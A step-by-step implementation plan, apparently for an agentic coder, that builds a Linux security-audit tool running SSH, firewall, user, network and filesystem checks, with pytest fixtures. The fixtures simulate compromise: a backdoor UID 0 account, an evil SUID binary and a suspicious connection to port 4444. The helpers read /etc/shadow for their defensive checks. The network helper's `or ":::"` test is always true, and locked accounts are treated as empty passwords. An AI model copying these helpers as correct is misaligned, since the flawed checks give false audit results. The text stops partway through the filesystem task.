# Full Security Audit Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a `full_security_audit` MCP tool that runs ~50 security checks across 10 categories and returns a scored JSON response with a Markdown report.

**Architecture:** One monolithic function `full_security_audit_impl()` in `security.py` calls private `_audit_*` helpers (one per category). Each helper returns a list of finding dicts. A scoring function aggregates findings into a weighted score. A formatting function generates the Markdown report. The tool is registered in `server.py`.

**Tech Stack:** Python 3.11+, paramiko (via SSHManager), pytest with unittest.mock

---

## File Structure

| File | Action | Responsibility |
|---|---|---|
| `src/agensysadmin/tools/security.py` | Modify | Add `full_security_audit_impl()` and 10 private `_audit_*` helpers, scoring, markdown formatter |
| `src/agensysadmin/server.py` | Modify | Register `full_security_audit` MCP tool |
| `tests/test_tools_security.py` | Modify | Add `TestFullSecurityAudit` with tests for each category, scoring, and report |

---

### Task 1: Scoring and Report Helpers

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

These are the foundation that all category helpers depend on: the finding dict structure, scoring logic, and markdown formatting.

- [ ] **Step 1: Write tests for scoring logic**

In `tests/test_tools_security.py`, add at the bottom:

```python
from agensysadmin.tools.security import _compute_scores, _format_report, _make_finding


class TestScoring:
    def test_make_finding(self):
        f = _make_finding("critical", "SSH root login", "FAIL", "PermitRootLogin yes", "Set to no")
        assert f == {
            "severity": "critical",
            "check": "SSH root login",
            "status": "FAIL",
            "detail": "PermitRootLogin yes",
            "recommendation": "Set to no",
        }

    def test_all_pass_score_100(self):
        findings = [
            _make_finding("pass", "Check A", "PASS", "ok", ""),
            _make_finding("pass", "Check B", "PASS", "ok", ""),
        ]
        categories = {"ssh": {"weight": 100, "findings": findings}}
        result = _compute_scores(categories)
        assert result["score"] == 100
        assert result["grade"] == "A"
        assert result["summary"]["pass"] == 2
        assert result["summary"]["critical"] == 0

    def test_critical_zeroes_category(self):
        findings = [
            _make_finding("pass", "Check A", "PASS", "ok", ""),
            _make_finding("critical", "Check B", "FAIL", "bad", "fix"),
        ]
        categories = {"ssh": {"weight": 100, "findings": findings}}
        result = _compute_scores(categories)
        assert result["score"] == 0
        assert result["grade"] == "F"
        assert result["categories"]["ssh"]["score"] == 0

    def test_weighted_average(self):
        cat_a_findings = [_make_finding("pass", "A", "PASS", "ok", "")]
        cat_b_findings = [_make_finding("warning", "B", "WARN", "meh", "fix")]
        categories = {
            "ssh": {"weight": 50, "findings": cat_a_findings},
            "firewall": {"weight": 50, "findings": cat_b_findings},
        }
        result = _compute_scores(categories)
        # ssh: 100% (1 pass / 1 total), firewall: 0% (0 pass / 1 total)
        assert result["score"] == 50
        assert result["grade"] == "C"

    def test_grade_thresholds(self):
        def score_for(s):
            f = [_make_finding("pass", "X", "PASS", "", "")] if s == 100 else [_make_finding("warning", "X", "WARN", "", "")]
            cats = {"x": {"weight": 100, "findings": f}}
            return _compute_scores(cats)["grade"]

        # Direct test: all-pass → A, all-warning → F
        assert score_for(100) == "A"
        assert score_for(0) == "F"


class TestFormatReport:
    def test_report_contains_sections(self):
        findings = [
            _make_finding("critical", "Root login", "FAIL", "PermitRootLogin yes", "Set to no"),
            _make_finding("pass", "Pubkey auth", "PASS", "PubkeyAuthentication yes", ""),
        ]
        categories = {"ssh": {"weight": 100, "findings": findings}}
        scores = _compute_scores(categories)
        report = _format_report("testhost", "1.2.3.4", scores, categories)
        assert "# Security Audit Report" in report
        assert "testhost" in report
        assert "1.2.3.4" in report
        assert "## SSH" in report
        assert "FAIL" in report
        assert "Root login" in report
        assert "## Recommendations" in report
        assert "[CRITICAL]" in report
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestScoring -v 2>&1 | head -30`

Expected: ImportError — `_compute_scores`, `_make_finding`, `_format_report` don't exist yet.

- [ ] **Step 3: Implement scoring and report helpers**

In `src/agensysadmin/tools/security.py`, add after the imports and before `check_updates_impl`:

```python
from datetime import datetime, timezone


def _make_finding(
    severity: str, check: str, status: str, detail: str, recommendation: str
) -> dict:
    return {
        "severity": severity,
        "check": check,
        "status": status,
        "detail": detail,
        "recommendation": recommendation,
    }


def _compute_scores(categories: dict) -> dict:
    summary = {"critical": 0, "warning": 0, "info": 0, "pass": 0}
    cat_scores = {}
    total_weight = 0

    for name, cat in categories.items():
        findings = cat["findings"]
        weight = cat["weight"]
        total_weight += weight

        has_critical = False
        pass_count = 0
        total_count = 0

        for f in findings:
            sev = f["severity"]
            summary[sev] = summary.get(sev, 0) + 1
            if sev == "critical":
                has_critical = True
            if sev == "pass":
                pass_count += 1
            total_count += 1

        if has_critical:
            cat_score = 0
        elif total_count == 0:
            cat_score = 100
        else:
            cat_score = int(pass_count / total_count * 100)

        cat_scores[name] = {"score": cat_score, "findings": findings}

    if total_weight == 0:
        overall = 0
    else:
        overall = int(
            sum(
                cat_scores[n]["score"] * categories[n]["weight"]
                for n in categories
            )
            / total_weight
        )

    if overall >= 90:
        grade = "A"
    elif overall >= 70:
        grade = "B"
    elif overall >= 50:
        grade = "C"
    elif overall >= 30:
        grade = "D"
    else:
        grade = "F"

    return {
        "score": overall,
        "grade": grade,
        "summary": summary,
        "categories": cat_scores,
    }


def _format_report(
    hostname: str, ip: str, scores: dict, categories: dict
) -> str:
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    lines = [
        "# Security Audit Report",
        f"**Server:** {hostname} ({ip})",
        f"**Date:** {timestamp}",
        f"**Score:** {scores['score']}/100 (Grade: {scores['grade']})",
        "",
        "## Summary",
        f"- Critical: {scores['summary']['critical']}",
        f"- Warning: {scores['summary']['warning']}",
        f"- Info: {scores['summary']['info']}",
        f"- Pass: {scores['summary']['pass']}",
        "",
    ]

    category_titles = {
        "ssh": "SSH",
        "firewall": "Firewall",
        "users": "Users & Auth",
        "network": "Network",
        "filesystem": "Filesystem",
        "services": "Services",
        "updates": "Updates",
        "logs": "Logs & Audit",
        "kernel": "Kernel & Sysctl",
        "malware": "Malware/Rootkit",
    }

    recommendations = []

    for name, cat in categories.items():
        cat_score = scores["categories"][name]["score"]
        title = category_titles.get(name, name.title())
        lines.append(f"## {title} (score: {cat_score}/100)")
        lines.append("")
        lines.append("| Status | Check | Detail |")
        lines.append("|---|---|---|")

        for f in cat["findings"]:
            lines.append(f"| {f['status']} | {f['check']} | {f['detail']} |")
            if f["recommendation"] and f["status"] != "PASS":
                tag = f["severity"].upper()
                recommendations.append(f"[{tag}] {f['recommendation']}")

        lines.append("")

    if recommendations:
        lines.append("## Recommendations")
        for i, rec in enumerate(recommendations, 1):
            lines.append(f"{i}. {rec}")
        lines.append("")

    return "\n".join(lines)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestScoring tests/test_tools_security.py::TestFormatReport -v`

Expected: All PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add scoring, finding, and report helpers for full audit"
```

---

### Task 2: SSH Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for SSH audit**

In `tests/test_tools_security.py`:

```python
from agensysadmin.tools.security import _audit_ssh


class TestAuditSSH:
    def test_secure_ssh_config(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="PermitRootLogin no\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="PasswordAuthentication no\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="PubkeyAuthentication yes\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="Port 2222\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="MaxAuthTries 3\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="AllowUsers admin deploy\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_ssh(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Root login"] == "PASS"
        assert statuses["Password authentication"] == "PASS"
        assert statuses["Public key authentication"] == "PASS"
        assert statuses["SSH port"] == "PASS"
        assert statuses["Max auth tries"] == "PASS"
        assert statuses["Access restrictions"] == "PASS"

    def test_insecure_ssh_config(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="PermitRootLogin yes\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="PasswordAuthentication yes\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="PubkeyAuthentication no\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),  # no Port directive → default 22
            CommandResult(stdout="MaxAuthTries 6\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),  # no AllowUsers
        ]
        findings = _audit_ssh(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Root login"] == "critical"
        assert statuses["Password authentication"] == "warning"
        assert statuses["Public key authentication"] == "warning"
        assert statuses["SSH port"] == "info"
        assert statuses["Max auth tries"] == "warning"
        assert statuses["Access restrictions"] == "info"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditSSH -v 2>&1 | head -20`

Expected: ImportError — `_audit_ssh` not defined.

- [ ] **Step 3: Implement `_audit_ssh`**

In `src/agensysadmin/tools/security.py`, add before `_compute_scores`:

```python
def _audit_ssh(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Root login
    r = ssh.execute(server, "sudo grep -i '^PermitRootLogin' /etc/ssh/sshd_config | tail -1")
    val = r.stdout.strip().split()[-1] if r.stdout.strip() else "yes"
    if val.lower() == "yes":
        findings.append(_make_finding("critical", "Root login", "FAIL", f"PermitRootLogin {val}", "Set PermitRootLogin to no in /etc/ssh/sshd_config"))
    else:
        findings.append(_make_finding("pass", "Root login", "PASS", f"PermitRootLogin {val}", ""))

    # Password authentication
    r = ssh.execute(server, "sudo grep -i '^PasswordAuthentication' /etc/ssh/sshd_config | tail -1")
    val = r.stdout.strip().split()[-1] if r.stdout.strip() else "yes"
    if val.lower() == "yes":
        findings.append(_make_finding("warning", "Password authentication", "WARN", f"PasswordAuthentication {val}", "Disable password auth, use SSH keys instead"))
    else:
        findings.append(_make_finding("pass", "Password authentication", "PASS", f"PasswordAuthentication {val}", ""))

    # Public key authentication
    r = ssh.execute(server, "sudo grep -i '^PubkeyAuthentication' /etc/ssh/sshd_config | tail -1")
    val = r.stdout.strip().split()[-1] if r.stdout.strip() else "yes"
    if val.lower() != "yes":
        findings.append(_make_finding("warning", "Public key authentication", "WARN", f"PubkeyAuthentication {val}", "Enable PubkeyAuthentication in sshd_config"))
    else:
        findings.append(_make_finding("pass", "Public key authentication", "PASS", f"PubkeyAuthentication {val}", ""))

    # SSH port
    r = ssh.execute(server, "sudo grep -i '^Port' /etc/ssh/sshd_config | tail -1")
    val = r.stdout.strip().split()[-1] if r.stdout.strip() else "22"
    if val == "22":
        findings.append(_make_finding("info", "SSH port", "INFO", "Port 22 (default)", "Consider changing SSH port to reduce scan noise"))
    else:
        findings.append(_make_finding("pass", "SSH port", "PASS", f"Port {val}", ""))

    # Max auth tries
    r = ssh.execute(server, "sudo grep -i '^MaxAuthTries' /etc/ssh/sshd_config | tail -1")
    val = r.stdout.strip().split()[-1] if r.stdout.strip() else "6"
    try:
        max_tries = int(val)
    except ValueError:
        max_tries = 6
    if max_tries > 3:
        findings.append(_make_finding("warning", "Max auth tries", "WARN", f"MaxAuthTries {max_tries}", "Set MaxAuthTries to 3 or less in sshd_config"))
    else:
        findings.append(_make_finding("pass", "Max auth tries", "PASS", f"MaxAuthTries {max_tries}", ""))

    # AllowUsers / AllowGroups
    r = ssh.execute(server, "sudo grep -iE '^(AllowUsers|AllowGroups)' /etc/ssh/sshd_config | tail -1")
    if r.stdout.strip():
        findings.append(_make_finding("pass", "Access restrictions", "PASS", r.stdout.strip(), ""))
    else:
        findings.append(_make_finding("info", "Access restrictions", "INFO", "No AllowUsers/AllowGroups set", "Consider restricting SSH access with AllowUsers or AllowGroups"))

    return findings
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditSSH -v`

Expected: All PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add SSH audit category"
```

---

### Task 3: Firewall Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for firewall audit**

```python
from agensysadmin.tools.security import _audit_firewall


class TestAuditFirewall:
    def test_ufw_active_deny_incoming(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            # which ufw
            CommandResult(stdout="/usr/sbin/ufw\n", stderr="", exit_code=0, duration_ms=10),
            # ufw status verbose
            CommandResult(
                stdout="Status: active\nDefault: deny (incoming), allow (outgoing)\n\nTo Action From\n-- ------ ----\n22/tcp ALLOW IN Anywhere\n",
                stderr="", exit_code=0, duration_ms=10,
            ),
        ]
        findings = _audit_firewall(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Firewall installed and active"] == "PASS"
        assert statuses["Default INPUT policy"] == "PASS"

    def test_no_firewall(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            # which ufw — not found
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),
            # which iptables
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),
            # which nft
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),
        ]
        findings = _audit_firewall(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Firewall installed and active"] == "critical"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditFirewall -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_firewall`**

```python
def _audit_firewall(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Check which firewall is available
    fw_type = None
    for cmd, name in [("which ufw", "ufw"), ("which iptables", "iptables"), ("which nft", "nft")]:
        r = ssh.execute(server, cmd)
        if r.exit_code == 0 and r.stdout.strip():
            fw_type = name
            break

    if not fw_type:
        findings.append(_make_finding("critical", "Firewall installed and active", "FAIL", "No firewall found (ufw/iptables/nft)", "Install and configure ufw: apt install ufw && ufw enable"))
        findings.append(_make_finding("critical", "Default INPUT policy", "FAIL", "No firewall", "Configure default deny incoming"))
        findings.append(_make_finding("info", "Firewall rules", "INFO", "No firewall installed", ""))
        return findings

    if fw_type == "ufw":
        r = ssh.execute(server, "sudo ufw status verbose")
        output = r.stdout.strip()
        active = "Status: active" in output

        if not active:
            findings.append(_make_finding("critical", "Firewall installed and active", "FAIL", "ufw installed but inactive", "Enable ufw: sudo ufw enable"))
        else:
            findings.append(_make_finding("pass", "Firewall installed and active", "PASS", f"ufw active", ""))

        # Default policy
        if "deny (incoming)" in output or "reject (incoming)" in output:
            findings.append(_make_finding("pass", "Default INPUT policy", "PASS", "Default deny/reject incoming", ""))
        else:
            findings.append(_make_finding("critical", "Default INPUT policy", "FAIL", "Default incoming is not deny/reject", "Set default deny: sudo ufw default deny incoming"))

        # Rule count
        rule_lines = [l for l in output.split("\n") if l.strip() and not l.startswith(("Status:", "Default:", "New", "Logging", "To", "--", ""))]
        findings.append(_make_finding("info", "Firewall rules", "INFO", f"{len(rule_lines)} rules configured", ""))

    else:
        # iptables / nft — just check if rules exist
        if fw_type == "iptables":
            r = ssh.execute(server, "sudo iptables -L INPUT -n 2>/dev/null | tail -n +3")
        else:
            r = ssh.execute(server, "sudo nft list ruleset 2>/dev/null")

        has_rules = bool(r.stdout.strip())
        if has_rules:
            findings.append(_make_finding("pass", "Firewall installed and active", "PASS", f"{fw_type} with rules", ""))
        else:
            findings.append(_make_finding("critical", "Firewall installed and active", "FAIL", f"{fw_type} installed but no rules", f"Configure {fw_type} rules"))

        # Check INPUT policy for iptables
        if fw_type == "iptables":
            r = ssh.execute(server, "sudo iptables -L INPUT -n 2>/dev/null | head -1")
            if "DROP" in r.stdout or "REJECT" in r.stdout:
                findings.append(_make_finding("pass", "Default INPUT policy", "PASS", "INPUT policy DROP/REJECT", ""))
            else:
                findings.append(_make_finding("critical", "Default INPUT policy", "FAIL", r.stdout.strip(), "Set INPUT policy to DROP"))
        else:
            findings.append(_make_finding("info", "Default INPUT policy", "INFO", "nft — check manually", ""))

        findings.append(_make_finding("info", "Firewall rules", "INFO", f"{fw_type} active", ""))

    return findings
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditFirewall -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add firewall audit category"
```

---

### Task 4: Users & Auth Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for users audit**

```python
from agensysadmin.tools.security import _audit_users


class TestAuditUsers:
    def test_clean_system(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="root\n", stderr="", exit_code=0, duration_ms=10),  # UID 0 users
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),  # empty passwords
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),  # inactive accounts
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),  # NOPASSWD grep
        ]
        findings = _audit_users(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Extra UID 0 users"] == "PASS"
        assert statuses["Empty passwords"] == "PASS"
        assert statuses["Inactive accounts"] == "PASS"
        assert statuses["NOPASSWD in sudoers"] == "PASS"

    def test_compromised_system(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="root\nbackdoor\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="guest\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="olduser\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="deploy ALL=(ALL) NOPASSWD: ALL\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_users(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Extra UID 0 users"] == "critical"
        assert statuses["Empty passwords"] == "critical"
        assert statuses["Inactive accounts"] == "warning"
        assert statuses["NOPASSWD in sudoers"] == "warning"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditUsers -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_users`**

```python
def _audit_users(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Extra UID 0 users
    r = ssh.execute(server, "awk -F: '$3 == 0 {print $1}' /etc/passwd")
    uid0_users = [u for u in r.stdout.strip().split("\n") if u.strip()]
    extra = [u for u in uid0_users if u != "root"]
    if extra:
        findings.append(_make_finding("critical", "Extra UID 0 users", "FAIL", f"UID 0 users: {', '.join(extra)}", "Remove extra UID 0 accounts or change their UID"))
    else:
        findings.append(_make_finding("pass", "Extra UID 0 users", "PASS", "Only root has UID 0", ""))

    # Empty passwords
    r = ssh.execute(server, "sudo awk -F: '($2 == \"\" || $2 == \"!\") && $1 != \"*\" {print $1}' /etc/shadow 2>/dev/null")
    empty_pw = [u for u in r.stdout.strip().split("\n") if u.strip()]
    if empty_pw:
        findings.append(_make_finding("critical", "Empty passwords", "FAIL", f"Accounts without password: {', '.join(empty_pw)}", "Set passwords or lock these accounts: passwd -l <user>"))
    else:
        findings.append(_make_finding("pass", "Empty passwords", "PASS", "No accounts with empty passwords", ""))

    # Inactive accounts (>90 days)
    r = ssh.execute(server, "lastlog -b 90 2>/dev/null | tail -n +2 | awk '$2 != \"**Never\" && NF > 1 {print $1}'")
    inactive = [u for u in r.stdout.strip().split("\n") if u.strip()]
    if inactive:
        findings.append(_make_finding("warning", "Inactive accounts", "WARN", f"Inactive >90 days: {', '.join(inactive[:5])}", "Review and disable inactive accounts: usermod -L <user>"))
    else:
        findings.append(_make_finding("pass", "Inactive accounts", "PASS", "No inactive accounts found", ""))

    # NOPASSWD in sudoers
    r = ssh.execute(server, "sudo grep -r 'NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null")
    if r.stdout.strip():
        lines = r.stdout.strip().split("\n")
        findings.append(_make_finding("warning", "NOPASSWD in sudoers", "WARN", f"{len(lines)} NOPASSWD entries found", "Remove NOPASSWD from sudoers unless absolutely required"))
    else:
        findings.append(_make_finding("pass", "NOPASSWD in sudoers", "PASS", "No NOPASSWD entries", ""))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditUsers -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add users & auth audit category"
```

---

### Task 5: Network Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for network audit**

```python
from agensysadmin.tools.security import _audit_network


class TestAuditNetwork:
    def test_minimal_network(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            # listening ports
            CommandResult(stdout="tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1234/sshd\n", stderr="", exit_code=0, duration_ms=10),
            # established outbound
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            # IPv6
            CommandResult(stdout="0\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_network(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Listening ports"] == "INFO"
        assert statuses["Outbound connections"] == "PASS"
        assert statuses["IPv6 status"] == "PASS"

    def test_exposed_network(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(
                stdout="tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1234/sshd\ntcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 5678/mysqld\ntcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTEN 9999/redis\n",
                stderr="", exit_code=0, duration_ms=10,
            ),
            CommandResult(stdout="tcp 0 0 10.0.0.1:43210 185.100.87.206:4444 ESTABLISHED 666/suspicious\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="1\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_network(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Listening ports"] == "info"
        assert statuses["Outbound connections"] == "warning"
        assert statuses["IPv6 status"] == "info"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditNetwork -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_network`**

```python
def _audit_network(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Listening ports on 0.0.0.0
    r = ssh.execute(server, "sudo ss -tlnp 2>/dev/null || sudo netstat -tlnp 2>/dev/null")
    lines = [l for l in r.stdout.strip().split("\n") if l.strip() and "LISTEN" in l]
    port_details = []
    for l in lines:
        parts = l.split()
        for p in parts:
            if "0.0.0.0:" in p or ":::":
                port_details.append(p)
                break
    findings.append(_make_finding("info", "Listening ports", "INFO", f"{len(lines)} ports listening: {', '.join(port_details[:10])}", "Review and close unnecessary ports"))

    # Suspicious outbound connections
    r = ssh.execute(server, "ss -tnp state established 2>/dev/null | grep -v '127.0.0.1' | tail -n +2")
    outbound = [l for l in r.stdout.strip().split("\n") if l.strip()]
    if outbound:
        findings.append(_make_finding("warning", "Outbound connections", "WARN", f"{len(outbound)} established outbound connections", "Review outbound connections for suspicious activity"))
    else:
        findings.append(_make_finding("pass", "Outbound connections", "PASS", "No outbound connections", ""))

    # IPv6
    r = ssh.execute(server, "cat /sys/module/ipv6/parameters/disable 2>/dev/null || echo 0")
    disabled = r.stdout.strip()
    if disabled == "1":
        findings.append(_make_finding("pass", "IPv6 status", "PASS", "IPv6 disabled", ""))
    else:
        findings.append(_make_finding("info", "IPv6 status", "INFO", "IPv6 enabled", "Disable IPv6 if not needed: net.ipv6.conf.all.disable_ipv6=1"))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditNetwork -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add network audit category"
```

---

### Task 6: Filesystem Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for filesystem audit**

```python
from agensysadmin.tools.security import _audit_filesystem


class TestAuditFilesystem:
    def test_secure_filesystem(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            # SUID/SGID — only standard ones
            CommandResult(stdout="/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chfn\n", stderr="", exit_code=0, duration_ms=10),
            # world-writable outside /tmp
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            # mount options for /tmp
            CommandResult(stdout="/dev/sda2 on /tmp type ext4 (rw,nosuid,noexec)\n", stderr="", exit_code=0, duration_ms=10),
            # permissions check
            CommandResult(stdout="-rw-r----- 1 root shadow 1234 Jan 1 00:00 /etc/shadow\n-rw-r--r-- 1 root root 2345 Jan 1 00:00 /etc/passwd\ndrwx------ 2 root root 4096 Jan 1 00:00 /etc/ssh\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_filesystem(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["SUID/SGID binaries"] == "PASS"
        assert statuses["World-writable files"] == "PASS"
        assert statuses["/tmp mount options"] == "PASS"
        assert statuses["Sensitive file permissions"] == "PASS"

    def test_insecure_filesystem(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="/usr/bin/passwd\n/usr/bin/sudo\n/opt/evil/backdoor\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/etc/crontab\n/var/www/config.php\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/dev/sda2 on /tmp type ext4 (rw,relatime)\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="-rw-rw-rw- 1 root shadow 1234 Jan 1 00:00 /etc/shadow\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_filesystem(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["SUID/SGID binaries"] == "warning"
        assert statuses["World-writable files"] == "warning"
        assert statuses["/tmp mount options"] == "warning"
        assert statuses["Sensitive file permissions"] == "critical"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditFilesystem -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_filesystem`**

```python
# Known-good SUID/SGID binaries for Debian/Ubuntu
_KNOWN_SUID = {
    "/usr/bin/passwd", "/usr/bin/sudo", "/usr/bin/chfn", "/usr/bin/chsh",
    "/usr/bin/gpasswd", "/usr/bin/newgrp", "/usr/bin/su", "/usr/bin/mount",
    "/usr/bin/umount", "/usr/bin/pkexec", "/usr/bin/crontab",
    "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
    "/usr/lib/openssh/ssh-keysign",
    "/usr/sbin/unix_chkpwd", "/usr/sbin/pam_extrausers_chkpwd",
    "/usr/bin/expiry", "/usr/bin/wall", "/usr/bin/ssh-agent",
    "/usr/bin/dotlockfile", "/usr/lib/x86_64-linux-gnu/utempter/utempter",
}


def _audit_filesystem(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # SUID/SGID binaries
    r = ssh.execute(server, "find / -perm /6000 -type f 2>/dev/null | head -50", timeout=60)
    suid_files = [f for f in r.stdout.strip().split("\n") if f.strip()]
    unknown_suid = [f for f in suid_files if f not in _KNOWN_SUID]
    if unknown_suid:
        findings.append(_make_finding("warning", "SUID/SGID binaries", "WARN", f"{len(unknown_suid)} non-standard: {', '.join(unknown_suid[:5])}", "Review and remove unnecessary SUID/SGID bits: chmod -s <file>"))
    else:
        findings.append(_make_finding("pass", "SUID/SGID binaries", "PASS", f"{len(suid_files)} standard SUID/SGID binaries", ""))

    # World-writable files outside /tmp
    r = ssh.execute(server, "find / -path /tmp -prune -o -path /var/tmp -prune -o -path /proc -prune -o -path /sys -prune -o -type f -perm -o+w -print 2>/dev/null | head -20", timeout=60)
